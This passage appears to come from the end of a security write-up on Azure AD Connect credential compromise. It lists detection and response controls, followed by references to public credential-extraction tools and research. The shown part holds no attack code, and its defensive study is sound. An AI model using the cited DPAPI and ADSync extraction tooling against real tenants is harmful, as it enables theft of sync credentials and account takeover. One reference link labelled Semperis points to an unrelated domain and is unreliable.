   - Restrict outbound connections to Azure endpoints only
   - Monitor inbound connections via firewall and EDR
   - Disable legacy authentication methods (NTLM, Basic Auth)

### Detective Controls

1. **Enable Advanced Auditing:**
   - Windows Event Log: Enable Registry auditing (SACL)
   - Sysmon: Monitor EventID 1 (Process Creation), 13 (Registry Set Value), 11 (File Create)
   - Azure AD: Enable detailed audit logging for sync account activities
   - Database: Enable SQL Server login auditing

2. **Deploy SIEM Correlation:**
   - Implement Splunk detection rules from Section 8
   - Correlate database access with registry queries
   - Monitor for DPAPI decryption operations
   - Alert on unusual authentication patterns for service accounts

3. **Cloud-Side Monitoring:**
   - Monitor Azure AD Directory Sync Account for:
     - Unusual API calls to Graph
     - Bulk user modifications
     - Unexpected group membership changes
     - Token usage from non-standard locations

### Reactive Controls

1. **Immediate Response:**
   - Revoke all refresh tokens for the AAD Connect account
   - Reset the service account password (disrupts sync - plan accordingly)
   - Disable the MSOL account in Active Directory
   - Force re-authentication for all synced users

2. **Investigation and Containment:**
   - Collect Windows Event Logs from Azure AD Connect server
   - Export MDB database for forensic analysis
   - Review audit logs for credential usage after extraction
   - Check for any created backdoor accounts in cloud and on-premises

3. **Recovery:**
   - Perform full domain password reset if DCSync was executed
   - Audit all Azure AD accounts for unauthorized role assignments
   - Review hybrid identity configuration for tampering
   - Restore from known-good backup if available

---

## 10. REFERENCES & PROOFS

- [Microsoft Azure AD Connect Documentation](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-hybrid-identity)
- [MITRE ATT&CK T1528 - Steal Application Access Token](https://attack.mitre.org/techniques/T1528/)
- [Semperis - Microsoft Entra Connect Compromise Explained](https://www.semperis.com/blog/microsoft-entra-connect-compromise-explained/)
- [Dirkjan Mollema - Updating adconnectdump - DPAPI Journey](https://dirkjanm.io/updating-adconnectdump-a-journey-into-dpapi/)
- [AADInternals - Decrypting ADSync Passwords](https://aadinternals.com/post/adsync/)
- [Varonis - Azure Skeleton Key: Pass-Through Auth Exploitation](https://www.varonis.com/blog/azure-skeleton-key)
- [Storm-0501: Ransomware Attacks Expanding to Hybrid Cloud Environments](https://www.microsoft.com/en-us/security/blog/2024/09/26/storm-0501-ransomware-attacks-expanding-to-hybrid-cloud-environments/)
- [Semperis - SyncJacking: Hard Matching Vulnerability](https://twoworldventures.com/syncjacking-hard-matching-vulnerability-enables-azure-ad-account-takeover/)
- [GitHub - dirkjanm/adconnectdump](https://github.com/dirkjanm/adconnectdump)
- [GitHub - VbScrub/AdSyncDecrypt](https://github.com/VbScrub/AdSyncDecrypt)
- [XPN InfoSec - Azure AD Connect for Red Teamers](https://blog.xpnsec.com/azuread-connect-for-redteam/)
- [Atomic Red Team - T1528 Tests](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1528/T1528.md)

---